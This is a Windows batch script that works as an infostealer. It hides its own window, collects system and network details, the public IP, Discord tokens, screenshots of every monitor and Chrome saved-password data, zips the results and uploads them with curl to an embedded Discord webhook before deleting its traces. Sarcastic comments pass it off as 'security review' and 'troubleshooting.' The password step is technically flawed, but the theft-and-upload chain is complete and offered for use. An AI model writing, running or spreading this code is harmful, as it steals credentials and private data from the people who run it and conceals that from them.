@echo off

if "%1" == "hidden" goto :main
start /min cmd /c "%~0" hidden & exit
:main

set WEBHOOK_URL=https://discord.com/api/webhooks/1367992952881680511/knLxmhVtqQEOnNei_V1gHaMTAXqvsBR5cdHdhIrAAHXsG5__5-BVvwZxBqFH3l9DOlZK

:: CREATE A RANDOM FOLDER IN TEMP TO STORE THE LOOT
set RND=%RANDOM%
set WORKDIR=%TEMP%\SysAudit_%RND%
mkdir "%WORKDIR%"

:: GRAB SYSTEM INFO (TOTALLY NORMAL ADMIN STUFF)
systeminfo > "%WORKDIR%\system_info.txt"
ipconfig /all > "%WORKDIR%\network_info.txt"
nslookup myip.opendns.com resolver1.opendns.com > "%WORKDIR%\public_ip.txt"

:: STEALTHILY GRAB DISCORD TOKENS (FOR "SECURITY REVIEW")
powershell -command "Get-ChildItem -Path $env:USERPROFILE\AppData\Roaming\Discord\Local Storage\leveldb\ -Filter *.ldb | ForEach-Object { $content = Get-Content $_.FullName -Raw; if ($content -match 'mfa\.[a-zA-Z0-9_-]{84}') { $matches[0] } }" > "%WORKDIR%\discord_tokens.txt"

:: SCREENSHOT ALL MONITORS (FOR "TROUBLESHOOTING")
powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screens = [System.Windows.Forms.Screen]::AllScreens; $bitmap = New-Object System.Drawing.Bitmap([int]($screens.Bounds.Width), [int]($screens.Bounds.Height)); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen([int]($screens.Bounds.X), [int]($screens.Bounds.Y), 0, 0, $bitmap.Size); $bitmap.Save('%WORKDIR%\screenshot.png'); $graphics.Dispose(); $bitmap.Dispose()"

:: DUMP BROWSER PASSWORDS (FOR "PASSWORD RECOVERY AUDIT")
:: (CHROME, EDGE, BRAVE - ADJUST AS NEEDED)
powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect((Get-Content -Path "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" -Encoding Byte -Raw), $null, 'CurrentUser')) | Out-File '%WORKDIR%\chrome_passwords.txt' -Encoding UTF8" 2>nul

:: ZIP IT ALL UP FOR CLEAN EXFIL
powershell -command "Compress-Archive -Path '%WORKDIR%' -DestinationPath '%WORKDIR%.zip' -Force"

:: UPLOAD TO DISCORD WEBHOOK (FOR "REMOTE ANALYSIS")
powershell -command "$webhook = '%WEBHOOK_URL%'; $zipPath = '%WORKDIR%.zip'; curl.exe -F file1=@$zipPath $webhook"

:: CLEAN UP (FRANK LEAVES NO TRACES)
timeout /t 3 >nul
rmdir /s /q "%WORKDIR%"
del "%WORKDIR%.zip" >nul 2>&1

:: EXIT SILENTLY
exit
